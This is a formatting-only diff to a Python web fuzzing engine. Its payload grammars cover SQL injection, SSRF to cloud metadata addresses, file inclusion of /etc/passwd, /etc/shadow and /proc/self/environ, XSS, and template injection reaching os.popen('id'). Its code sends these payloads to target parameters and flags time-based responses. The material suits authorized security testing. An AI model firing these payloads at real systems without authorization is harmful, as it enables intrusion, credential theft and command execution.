@@ -41,7 +41,7 @@ class FuzzSeed:
 GRAMMARS = {
     "sql": {
         "number": ["1", "0", "-1", "999"],
-        "string": ["'", "\"", "')", "\"))"],
+        "string": ["'", '"', "')", '"))'],
         "operator": ["=", "!=", ">", "<", "LIKE", "IN"],
         "keyword": ["UNION", "SELECT", "FROM", "WHERE", "SLEEP", "BENCHMARK"],
         "comment": ["--", "#", "/*", "*/"],
@@ -55,8 +55,11 @@ GRAMMARS = {
     "ssrf": {
         "protocol": ["http://", "https://", "file:///", "dict://", "gopher://", "ftp://"],
         "target": [
-            "169.254.169.254", "127.0.0.1", "localhost",
-            "metadata.google.internal", "100.100.100.200",
+            "169.254.169.254",
+            "127.0.0.1",
+            "localhost",
+            "metadata.google.internal",
+            "100.100.100.200",
         ],
         "path": ["/latest/meta-data/", "/", "/admin", "/env", "/health"],
         "template": [
@@ -68,13 +71,18 @@ GRAMMARS = {
     "lfi": {
         "prefix": ["", "...", "....", "..%252f", "..%c0%ae%c0%ae"],
         "path": [
-            "/etc/passwd", "/etc/shadow", "/windows/win.ini",
-            "/proc/self/environ", "/proc/self/fd/0",
+            "/etc/passwd",
+            "/etc/shadow",
+            "/windows/win.ini",
+            "/proc/self/environ",
+            "/proc/self/fd/0",
         ],
         "wrapper": [
             "php://filter/convert.base64-encode/resource=",
-            "php://input", "data://text/plain,",
-            "expect://", "zip://",
+            "php://input",
+            "data://text/plain,",
+            "expect://",
+            "zip://",
         ],
         "template": [
             "{prefix}/{path}",
@@ -91,7 +99,7 @@ GRAMMARS = {
             "<script>{payload}</script>",
             "<img src=x {event}{payload}>",
             "<svg/onload={payload}>",
-            "\" onmouseover={payload} \"",
+            '" onmouseover={payload} "',
             "';{payload}//",
         ],
     },
@@ -99,12 +107,19 @@ GRAMMARS = {
         "delimiter": ["{{", "}}", "${", "}", "#{", "}", "{%", "%}"],
         "payload": ["7*7", "config", "self", "request", "app"],
         "call": [
-            "__class__", "__mro__", "__subclasses__()",
-            "__builtins__", "__import__('os').popen('id').read()",
+            "__class__",
+            "__mro__",
+            "__subclasses__()",
+            "__builtins__",
+            "__import__('os').popen('id').read()",
         ],
         "template": [
-            "{{7*7}}", "{{config}}", "{{self.__class__.__mro__}}",
-            "${7*7}", "#{7*7}", "{%print(7*7)%}",
+            "{{7*7}}",
+            "{{config}}",
+            "{{self.__class__.__mro__}}",
+            "${7*7}",
+            "#{7*7}",
+            "{%print(7*7)%}",
         ],
     },
     "cmdi": {
@@ -155,8 +170,7 @@ class FuzzEngine:
                         seeds.append(FuzzSeed(v, vuln_type, weight=0.7, tags=[key]))
             self.seed_pool[vuln_type] = seeds
 
-    def generate(self, vuln_type: str, count: int = 10,
-                 intensity: float = 0.5) -> List[str]:
+    def generate(self, vuln_type: str, count: int = 10, intensity: float = 0.5) -> List[str]:
         seeds = self.seed_pool.get(vuln_type, [])
         if not seeds:
             # 未知类型不再回退全语法池 (会把 SQL 载荷当 open_redirect 等使用).
@@ -170,8 +184,9 @@ class FuzzEngine:
         random.shuffle(results)
         return results[:count]
 
-    def generate_hybrid(self, param_name: str, url_path: str = "",
-                         response_hints: List[str] = None) -> List[str]:
+    def generate_hybrid(
+        self, param_name: str, url_path: str = "", response_hints: List[str] = None
+    ) -> List[str]:
         payloads = []
         param_lower = param_name.lower()
 
@@ -216,13 +231,18 @@ class FuzzEngine:
             payloads.extend(self.generate(vt, count=5))
         return payloads[:30]
 
-    def test_payloads(self, url: str, param: str, payloads: List[str],
-                       baseline_status: int = 200) -> List[Dict]:
+    def test_payloads(
+        self, url: str, param: str, payloads: List[str], baseline_status: int = 200
+    ) -> List[Dict]:
         results = []
         baseline = None
         try:
             r = self.sess.get(url, params={param: "1"}, timeout=self.timeout)
-            baseline = {"status": r.status_code, "size": len(r.text), "time": r.elapsed.total_seconds()}
+            baseline = {
+                "status": r.status_code,
+                "size": len(r.text),
+                "time": r.elapsed.total_seconds(),
+            }
         except Exception:
             baseline = {"status": 0, "size": 0, "time": 0}
         baseline_ok = baseline["status"] != 0
@@ -256,20 +276,27 @@ class FuzzEngine:
                 results.append(resp)
             except requests.Timeout:
                 # 超时载荷不能静默丢弃: 可能是 time-based 注入信号.
-                resp = {"payload": payload[:80], "status": 0, "size": 0,
-                        "time": self.timeout, "interesting": True,
-                        "note": "timeout (possible time-based)"}
+                resp = {
+                    "payload": payload[:80],
+                    "status": 0,
+                    "size": 0,
+                    "time": self.timeout,
+                    "interesting": True,
+                    "note": "timeout (possible time-based)",
+                }
                 with self._lock:
                     self.interesting_inputs.append(resp)
                 results.append(resp)
             except Exception as e:
-                results.append({"payload": payload[:80], "error": str(e)[:60],
-                                "interesting": False})
+                results.append(
+                    {"payload": payload[:80], "error": str(e)[:60], "interesting": False}
+                )
         return results
 
     def fuzz_endpoint(self, url: str, param: str, response_hints: List[str] = None) -> Dict:
         import re
-        path = re.sub(r'https?://[^/]+', '', url)
+
+        path = re.sub(r"https?://[^/]+", "", url)
         payloads = self.generate_hybrid(param, path, response_hints)
         test_results = self.test_payloads(url, param, payloads)
         interesting = [r for r in test_results if r.get("interesting")]
@@ -297,8 +324,9 @@ class FuzzEngine:
         }
 
 
-def run_fuzz(sess, base_url: str, timeout: float = 10.0,
-             endpoints: Optional[List[Dict]] = None) -> Dict:
+def run_fuzz(
+    sess, base_url: str, timeout: float = 10.0, endpoints: Optional[List[Dict]] = None
+) -> Dict:
     engine = FuzzEngine(sess, timeout)
     if endpoints:
         return engine.fuzz_batch(endpoints)
